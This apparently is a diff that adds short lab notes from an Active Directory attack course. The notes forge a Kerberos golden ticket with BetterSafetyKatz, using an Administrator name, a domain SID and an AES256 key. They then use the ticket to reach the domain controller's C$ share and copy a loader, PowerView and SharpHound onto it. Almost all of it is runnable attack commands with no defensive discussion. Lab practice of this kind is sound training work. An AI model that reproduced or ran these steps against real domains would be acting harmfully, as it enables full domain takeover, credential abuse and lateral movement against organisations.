@@ -1,0 +1,10 @@
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:e28b3a5c60e087c8489a410a1199235efaf3b9f125972c7a1e7618a7469bfd6a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+dir \\dcorp-dc\c$ ( able to access shared drive)
+pushd \\dcorp-dc\c$ (interact with DC from the Golden shell)
+cd ntds ( just to test)
+run whoami and Hostname command ( student name will be displayed)
+navigate to dir \\dcorp-dc\c$\Users\Public
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe ( copy the loader from student VM to dcorp-dc)
+echo F | xcopy C:\AD\Tools\RunWithRegistryNonAdmin.bat \\dcorp-dc\C$\Users\Public\RunWithRegistryNonAdmin.bat
+echo F | xcopy C:\AD\Tools\PowerView.ps1 \\dcorp-dc\C$\Users\Public\PowerView.ps1
+echo F | xcopy C:\AD\Tools\SharpHound.ps1 \\dcorp-dc\C$\Users\Public\SharpHound.ps1
